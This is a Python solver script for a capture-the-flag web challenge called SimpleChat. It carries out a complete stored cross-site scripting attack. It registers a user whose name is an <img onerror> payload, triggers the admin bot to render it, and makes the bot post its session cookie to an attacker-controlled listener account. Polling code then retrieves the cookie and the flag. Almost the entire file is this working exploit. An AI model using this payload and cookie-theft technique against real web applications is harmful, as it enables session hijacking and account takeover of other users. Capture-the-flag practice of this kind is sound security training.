#!/usr/bin/env python3
"""SimpleChat - kashiCTF 2026 - Stored XSS via unsanitized sender field"""
import requests, time, sys
from urllib.parse import unquote

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://webchal-production.up.railway.app"

# 1. Register listener (receives exfiltrated cookie)
s = requests.Session()
listener = f"listen_{int(time.time())}"
s.post(f"{BASE}/api/v1/register", json={"username": listener, "password": "Test12345"})
print(f"[1] Listener: {listener}")

# 2. XSS payload: admin sends their cookie as a chat message to listener
js = (
    f"fetch('/api/v1/insertChat',{{method:'POST',"
    f"headers:{{'Content-Type':'application/json'}},"
    f"body:JSON.stringify({{sender:'admin',receiver:'{listener}',message:document.cookie}}),"
    f"credentials:'same-origin'}})"
)
xss_user = f'<img src=x onerror="{js}">'

# 3. Register XSS user
s2 = requests.Session()
s2.post(f"{BASE}/api/v1/register", json={"username": xss_user, "password": "Test12345"})
print(f"[2] XSS user registered")

# 4. Send message to admin (sender = XSS username, rendered unsanitized)
s2.post(f"{BASE}/api/v1/insertChat", json={
    "sender": xss_user, "receiver": "admin", "message": "check this"
})
print(f"[3] Message sent to admin")

# 5. Trigger admin bot
s2.get(f"{BASE}/ping", params={"friend": xss_user})
print(f"[4] Admin pinged")

# 6. Wait for cookie exfiltration
print(f"[5] Waiting for admin cookie...")
for i in range(20):
    time.sleep(3)
    r = s.get(f"{BASE}/api/v1/getChat", params={"friend": "admin"})
    for m in r.json().get("messages", []):
        if "flag=" in m.get("message", "") or "connect.sid" in m.get("message", ""):
            cookie = unquote(m["message"])
            print(f"\n[FLAG] {cookie}")
            # Extract flag from cookie string
            for part in cookie.split(";"):
                part = part.strip()
                if part.startswith("flag="):
                    flag = part[5:]
                    print(f"\n{flag}")
                    with open("flag.txt", "w") as f:
                        f.write(flag + "\n")
            sys.exit(0)
    if (i + 1) % 3 == 0:
        print(f"  ...{(i+1)*3}s elapsed")

print("Timed out waiting for admin")
